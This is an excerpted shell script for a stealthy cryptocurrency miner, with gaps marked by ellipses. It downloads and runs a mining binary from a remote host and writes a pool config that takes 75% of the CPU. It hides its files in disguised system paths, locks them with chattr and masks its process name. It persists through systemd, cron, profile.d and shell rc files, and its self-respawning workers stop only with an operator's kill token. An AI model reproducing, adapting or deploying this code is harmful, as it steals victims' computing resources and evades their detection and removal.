...
r(){ head -c "$1" /dev/urandom 2>/dev/null|tr -dc 'a-z0-9'|head -c "$1"||openssl rand -hex 16 2>/dev/null|tr -dc 'a-z0-9'|head -c "$1"; }
pick1(){ if [ "$(id -u)" = 0 ];then for b in /usr/lib/.locale /usr/share/.locale /var/lib/.uuid;do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&[ -d "$b" ]&&{ echo "$b";return; };fi;done;fi;for b in /var/tmp/.font-unix /dev/shm/.u /var/tmp/.d1 "$HOME/.d1";do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&[ -d "$b" ]&&{ echo "$b";return; };fi;done; }
pick2(){ if [ "$(id -u)" = 0 ];then for b in /var/cache/.index /var/spool/.queue /usr/libexec/.cache;do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&[ -d "$b" ]&&{ echo "$b";return; };fi;done;fi;for b in /var/tmp/.systemd-private /dev/shm/.i /var/tmp/.d2 "$HOME/.d2";do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&[ -d "$b" ]&&{ echo "$b";return; };fi;done; }
pick3(){ for b in /tmp/.ICE-unix/.d /tmp/.X11-unix/.d /dev/shm/.d /var/tmp/.d3 "$HOME/.d3";do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&[ -d "$b" ]&&{ echo "$b";return; };fi;done; }
ST="$(pick3)/.s"
LG="$HOME/.cache/.m""iner_state";[ -f "$LG" ]&&{ read OW OD OS OT<"$LG" 2>/dev/null;[ -n "$OS" ]&&{ systemctl --user stop "$OS" 2>/dev/null;systemctl --user disable "$OS" 2>/dev/null;systemctl stop "$OS" 2>/dev/null;systemctl disable "$OS" 2>/dev/null;rm -f "$HOME/.config/systemd/user/${OS}.service" "/etc/systemd/system/${OS}.service" 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;systemctl daemon-reload 2>/dev/null; };[ -n "$OT" ]&&{ crontab -l 2>/dev/null|grep -v "$OT"|crontab - 2>/dev/null;rm -f /etc/cron.d/.sys_"$OT" /etc/profile.d/.sys_"$OT".sh 2>/dev/null;for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do [ -f "$rc" ]&&grep -q "$OT" "$rc" 2>/dev/null&&{ grep -v "$OT" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; };done; };[ -n "$OD" ]&&{ chattr -R -i "$OD" 2>/dev/null;rm -rf "$OD" 2>/dev/null; };[ -n "$OW" ]&&{ chattr -R -i "$OW" 2>/dev/null;rm -rf "$OW" 2>/dev/null; };rm -f "$LG" 2>/dev/null; }
...
ok=0;for i in 1 2 3;do if command -v curl >/dev/null 2>&1;then curl -fsSL --connect-timeout 30 --max-time 120 -o "$W1/$BN" "$RAW/$SRC" 2>/dev/null&&ok=1&&break;elif command -v wget >/dev/null 2>&1;then wget -q --timeout=30 -O "$W1/$BN" "$RAW/$SRC" 2>/dev/null&&ok=1&&break;fi;sleep 2;done
[ "$ok" = 0 ]&&{ echo "download failed: $RAW/$SRC">&2;exit 1; }
chmod +x "$W1/$BN"
...
MB="$(basename "$0")"
ROLE="${MB##*_}"
r(){ head -c "$1" /dev/urandom 2>/dev/null|tr -dc 'a-z0-9'|head -c "$1"; }
hc(){ command -v chattr >/dev/null 2>&1&&[ "$(id -u)" = 0 ]; }
sh(){ hc&&chattr -R +i "$1" 2>/dev/null; }
us(){ hc&&chattr -R -i "$1" 2>/dev/null; }
nx(){ local b i=0 t;b="${1%%_*}";for nb in $NAMES;do i=$((i+1));[ "$nb" = "$b" ]&&break;done;t=$(echo $NAMES|cut -d' ' -f$(((i%15)+1)));echo "${t}_x$(r 4)"; }
fnd(){ find "$MYDIR" -maxdepth 1 -type f -name '*_x????' ! -name '.*' 2>/dev/null|head -1; }
...
bld(){ mkdir -p "$MYDIR" 2>/dev/null;[ -f "$MYDIR/.c" ]||{ printf '{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$POOL" "$W" "$PW">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }; }
die(){ local kc e d rc;[ -z "$TK" ]&&{ rm -f "$MYDIR/.die" 2>/dev/null;return; };kc=$(cat "$MYDIR/.die" 2>/dev/null);[ "$kc" != "$TK" ]&&{ rm -f "$MYDIR/.die" 2>/dev/null;return; };for e in $ROLES;do d="${e%%:*}";us "$d";printf '%s' "$kc">"$d/.die" 2>/dev/null;done;sleep 2;if [ -n "$SV" ];then systemctl --user stop "$SV" 2>/dev/null;systemctl --user disable "$SV" 2>/dev/null;systemctl stop "$SV" 2>/dev/null;systemctl disable "$SV" 2>/dev/null;rm -f "$HOME/.config/systemd/user/${SV}.service" "/etc/systemd/system/${SV}.service" 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;systemctl daemon-reload 2>/dev/null;fi;if [ -n "$TG" ];then crontab -l 2>/dev/null|grep -v "$TG"|crontab - 2>/dev/null;rm -f "/etc/cron.d/.s_${TG}" "/etc/profile.d/.s_${TG}.sh" 2>/dev/null;for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do [ -f "$rc" ]&&grep -q "$TG" "$rc" 2>/dev/null&&{ grep -v "$TG" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; };done;fi;for e in $ROLES;do d="${e%%:*}";us "$d";rm -rf "$d" 2>/dev/null;done;rm -f "$ST" 2>/dev/null;exit 0; }
cnt=0
while :;do
[ -f "$MYDIR/.die" ]&&die
rep
...
if [ "$ROLE" = "w1" ];then
sleep $((RANDOM%3))
if ! pgrep -f '_x[a-z0-9]{4}'>/dev/null 2>&1;then
bld
bin=$(fnd)
if [ -z "$bin" ];then
for i in 1 2 3;do curl -fsSL --connect-timeout 30 --max-time 120 -o "$MYDIR/.t" "$RAW/$SRC" 2>/dev/null&&break;wget -q --timeout=30 -O "$MYDIR/.t" "$RAW/$SRC" 2>/dev/null&&break;sleep 2;done
...
cd "$MYDIR"
FN="$(basename "$bin")"
bash -c 'exec -a "'"$FN"'" "$0" -c .c' "$RB" >/dev/null 2>&1
rm -f "$RB" 2>/dev/null
nb=$(nx "$(basename "$bin")")
...
nohup "$W1/$DN1" >/dev/null 2>&1 &
nohup "$W2/$DN2" >/dev/null 2>&1 &
nohup "$W3/$DN3" >/dev/null 2>&1 &
...
echo "  pass : $P"
echo "  token: $TK"
echo "  sysd : $([ "$SO" = 1 ]&&echo Y||echo N)"
echo "  cron : $([ "$CO" = 1 ]&&echo Y||echo N)"
echo "  rc   : $([ "$RO" = 1 ]&&echo Y||echo N)"
echo "  st   : $ST"
echo "=========================================="
echo "  SIMPAN TOKEN! tanpa token susah kill"
